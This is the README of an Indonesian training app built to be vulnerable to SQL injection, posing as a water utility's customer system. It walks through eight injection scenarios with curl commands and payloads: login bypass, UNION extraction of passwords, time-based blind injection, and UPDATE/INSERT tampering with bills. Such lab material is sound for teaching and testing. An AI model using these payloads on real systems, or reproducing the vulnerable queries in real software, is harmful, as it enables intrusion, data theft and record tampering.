# PDAM Tirta Asasta Depok — REST API Demo SQL Injection

> ⚠️ **DISCLAIMER — HANYA UNTUK PEMBELAJARAN**
>
> Proyek ini dibuat **murni untuk tujuan edukasi / latihan keamanan web (SQL Injection)**.
> Ini **bukan** aplikasi resmi, **bukan** produk, dan **tidak berafiliasi** dengan PDAM Tirta Asasta Depok
> atau perusahaan mana pun. Semua nama, data, akun, dan kredensial di sini adalah **fiktif/contoh**.
> Jangan gunakan kode ini untuk keperluan produksi atau aktivitas ilegal.

Aplikasi web rentan SQL Injection untuk edukasi — sistem informasi pelanggan PDAM Tirta Asasta Depok (Perseroda).

Aplikasi ini punya **dua permukaan (surface)** yang keduanya rentan:

1. **Web UI (server-rendered)** — halaman HTML dari EJS, auth pakai **session cookie** (`express-session`).
   Route: `/`, `/login`, `/dashboard`, `/customers`, `/customer/:id`, `/customer/:id/edit`, `/bill/:id`, `/bill/:id/pay`, `/export`, `/meter`.
2. **REST API (JSON)** — endpoint `/api/*`, auth pakai **Bearer token** (in-memory `Map`).
   Untuk konsumsi program/mobile, bukan halaman.

> Auth-nya juga terpisah: session untuk views, token untuk API. Keduanya memakai query SQL yang sama-sama rentan.

## Stack

- **Backend**: Node.js + Express
- **View**: EJS (server-side rendering)
- **Database**: MySQL 8.0 (Docker)
- **Auth**: Session cookie (views) + Bearer Token in-memory (API)

## Cara Menjalankan

```bash
npm install
mysql -u root -proot pdam_tirta_asasta < db/init.sql   # inisialisasi DB
node app.js                                              # jalankan API
# → http://localhost:3000
```

### Docker MySQL
```bash
docker run -d --name pdam-mysql -e MYSQL_ROOT_PASSWORD=root -e MYSQL_DATABASE=pdam_tirta_asasta -p 3306:3306 mysql:8.0
```

## Endpoint REST API (`/api/*`)

> Halaman web (HTML) memakai route terpisah tanpa prefix `/api`, dengan auth session — lihat daftar di bagian atas.

| Method | Endpoint | Auth | Keterangan |
|--------|----------|------|------------|
| `POST` | `/api/login` | ❌ | Login → dapat token |
| `GET` | `/api/customers?search=` | ✅ | Daftar & cari pelanggan |
| `GET` | `/api/customers/:id` | ✅ | Detail pelanggan + tagihan |
| `PUT` | `/api/customers/:id` | ✅ | Update data pelanggan |
| `GET` | `/api/bills/:id` | ✅ | Detail tagihan |
| `GET` | `/api/export?table=` | ✅ | Export tabel |
| `POST` | `/api/logout` | ✅ | Logout (hapus token) |

Auth: `Authorization: Bearer <token>`

## Database

Tabel:
- `users` — pegawai/admin (username, password, role, nama_lengkap)
- `customers` — data pelanggan
- `bills` — tagihan air per bulan

Akun demo: `admin` / `admin123` · `operator1` / `op12345` · `manager` / `manager123`

---

## 📌 Skenario SQL Injection

### 1. Login Bypass (Auth Bypass)

**Endpoint**: `POST /api/login`  
**Query vulnerable**:
```sql
SELECT * FROM users WHERE username = '${username}' AND password = '${password}'
```

**Eksploitasi**:
```bash
curl -X POST http://localhost:3000/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"' OR 1=1 -- ","password":"sembarang"}'
```

SQL menjadi:
```sql
SELECT * FROM users WHERE username = '' OR 1=1 -- ' AND password = 'sembarang'
```

`1=1` selalu true, `--` mengomentari sisanya. Login sebagai `admin` tanpa tahu password.

---

### 2. UNION Injection — Ekstraksi Data

**Endpoint**: `GET /api/customers?search=`  
**Query vulnerable**:
```sql
SELECT * FROM customers WHERE nama LIKE '%${search}%' OR no_sambung LIKE '%${search}%'
```

**Eksploitasi — baca tabel users**:
```bash
TOKEN="tok_1"  # dari login
curl -s "http://localhost:3000/api/customers?search=' UNION SELECT id,username,password,role,nama_lengkap,6,7,8,9,10 FROM users -- " \
  -H "Authorization: Bearer $TOKEN" | jq
```

Kolom `customers` (10 kolom): `id, no_sambung, nama, alamat, kecamatan, kelurahan, golongan, tarif_per_m3, status, created_at`.

Data users tampil di response — username & password terekspos.

---

### 3. Time-Based Blind SQLi

**Endpoint**: `GET /api/bills/:id`  
**Query vulnerable**:
```sql
SELECT b.*, c.nama, c.no_sambung FROM bills b JOIN customers c ON b.customer_id = c.id WHERE b.id = ${id}
```

**Eksploitasi — konfirmasi**:
```bash
# True — delay 2 detik
time curl -s "http://localhost:3000/api/bills/1 AND IF(1=1,SLEEP(2),0)" -H "Authorization: Bearer $TOKEN"

# False — instan
time curl -s "http://localhost:3000/api/bills/1 AND IF(1=2,SLEEP(2),0)" -H "Authorization: Bearer $TOKEN"
```

**Ekstraksi karakter per karakter** (tebak huruf pertama password admin):
```bash
# Delay 2 detik → huruf pertama 'a'
time curl -s "http://localhost:3000/api/bills/1 AND IF(SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a',SLEEP(2),0)" -H "Authorization: Bearer $TOKEN"
```

---

### 4. Table Injection pada Export

**Endpoint**: `GET /api/export?table=`  
**Query vulnerable**:
```sql
SELECT * FROM ${table}
```

**Eksploitasi**:
```bash
curl -s "http://localhost:3000/api/export?table=users" -H "Authorization: Bearer $TOKEN" | jq
```

Mengekspor seluruh data dari tabel `users`. Bisa dikombinasikan dengan WHERE / UNION.

---

### 5. UPDATE Injection — Edit Data Pelanggan

**Endpoint**: `PUT /api/customers/:id`  
**Body**: `{ "nama", "alamat", "kecamatan", "kelurahan", "golongan", "status" }`  
**Query vulnerable**:
```sql
UPDATE customers SET nama='${nama}', alamat='${alamat}', kecamatan='${kecamatan}',
kelurahan='${kelurahan}', golongan='${golongan}', status='${status}' WHERE id = ${id}
```

**Eksploitasi — ubah data pelanggan lain**:

Field `nama` diisi:
```bash
curl -X PUT http://localhost:3000/api/customers/1 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"nama":"x", "status":"nonaktif" WHERE id=2 -- ","alamat":"x","kecamatan":"x","kelurahan":"x","golongan":"R1"}'
```

SQL menjadi:
```sql
UPDATE customers SET nama='x', status='nonaktif' WHERE id=2 -- ', alamat='x', ... WHERE id = 1
```

Pelanggan ID 2 berubah statusnya tanpa mengakses form edit ID 2.

---

### 6. UPDATE Injection — Pembayaran Tagihan

**View**: `POST /bill/:id/pay`  
**API**: `PUT /api/bills/:id/pay`  
**Query vulnerable**:
```sql
UPDATE bills SET status_bayar='lunas', tgl_bayar=CURDATE() WHERE id = ${id}
```

SQL injection via parameter `id` di URL — sama seperti endpoint bill detail.

**Eksploitasi — bayar semua tagihan sekaligus**:
```bash
curl -s -X PUT "http://localhost:3000/api/bills/1 OR 1=1" -H "Authorization: Bearer $TOKEN"
```

SQL menjadi:
```sql
UPDATE bills SET status_bayar='lunas', tgl_bayar=CURDATE() WHERE id = 1 OR 1=1
```
Semua tagihan di database berstatus lunas.

---

### 7. Cek Tagihan Publik — Tanpa Login (SQLi di no_sambung)

**View**: `GET /cek-tagihan?no_sambung=`  
**API**: `GET /api/cek-tagihan?no_sambung=`  
**Query vulnerable**:
```sql
SELECT b.*, c.nama, c.alamat, c.kecamatan FROM bills b
JOIN customers c ON b.customer_id = c.id
WHERE c.no_sambung = '${no_sambung}'
```

⚠️ Endpoint ini **tidak membutuhkan login** — publik bisa akses.

**Eksploitasi — UNION injection**:
```
?no_sambung=' UNION SELECT id,username,password,4,5,6,7,8,9,10,11,12 FROM users -- 
```

**Eksploitasi — blind SQLi via delay**:
```
?no_sambung=TA2023001' AND IF(1=1,SLEEP(2),0) -- 
```

---

### 8. INSERT Injection — Input Meter Bulanan

**View**: `POST /meter`  
**API**: `POST /api/meter`  
**Body**: `{ "customer_id", "bulan", "tahun", "pemakaian_m3" }`  
**Query vulnerable**:
```sql
INSERT INTO bills (customer_id, bulan, tahun, pemakaian_m3, tagihan, status_bayar)
VALUES (${customer_id}, ${bulan}, ${tahun}, ${pemakaian_m3}, ${tagihan}, 'belum')
```

Semua field di-body dirender langsung tanpa parameterized query.

**Eksploitasi — subquery di pemakaian**:
```bash
curl -X POST http://localhost:3000/api/meter \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"customer_id":1,"bulan":11,"tahun":2026,"pemakaian_m3":"999"}'
```

**Eksploitasi — ekstrak data ke kolom tagihan**:
```bash
curl -X POST http://localhost:3000/api/meter \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"customer_id":"1","bulan":11,"tahun":2026,"pemakaian_m3":"(SELECT password FROM users WHERE id=1)"}'
```

SQL menjadi:
```sql
INSERT INTO bills ... VALUES (1, 11, 2026, (SELECT password FROM users WHERE id=1), ..., 'belum')
```
Password admin tersimpan sebagai pemakaian — bisa dibaca di detail tagihan.

---

> ⚠️ Aplikasi ini dibuat **khusus untuk demo/edukasi keamanan web**. Jangan pernah menggunakan kode dengan kerentanan serupa di lingkungan production.
